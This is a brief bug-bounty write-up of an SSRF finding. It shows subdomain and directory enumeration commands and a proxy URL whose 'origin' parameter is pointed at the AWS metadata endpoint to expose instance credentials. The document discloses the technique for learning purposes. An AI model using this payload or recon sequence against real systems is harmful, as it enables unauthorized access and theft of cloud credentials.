# My First Case of SSRF Using Dirsearch 🐿️

1. I started by getting all the subdomains and directories of my target using Subfinder
```
subfinder -d target.com | tee target.txt
python3 dirsearch.py -l target.txt --deep-recursive
```
2. I found a URL that was like: 
```
targetconnect-dev.target.com/proxy.stream?origin=https://google.com
```
3. I tried using an Out Of Band Interaction Tester (OOB) like BurpSuite Collaborator and it worked. I received a pingback.
4. I now searched the parameter on Google and found a tweet where someone tried to use the AWS Metadata URL, so I tried using it and it worked.<br>
```
/proxy.stream?origin=http://169.254.169.254/latest/metadata/
```
I was able to view the AWS Metadata credentials.

<br>&nbsp;
## Credit
Based on [Mba-oji Chiagoziem](https://goziem.medium.com/my-first-case-of-ssrf-using-dirsearch-b916f0f1e94b)'s writeup.
<br>&nbsp;

## Support
You can Follow [me](https://twitter.com/MeAsHacker_HNA) on twitter or
<br><br><a href="https://www.buymeacoffee.com/NafisiAslH" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
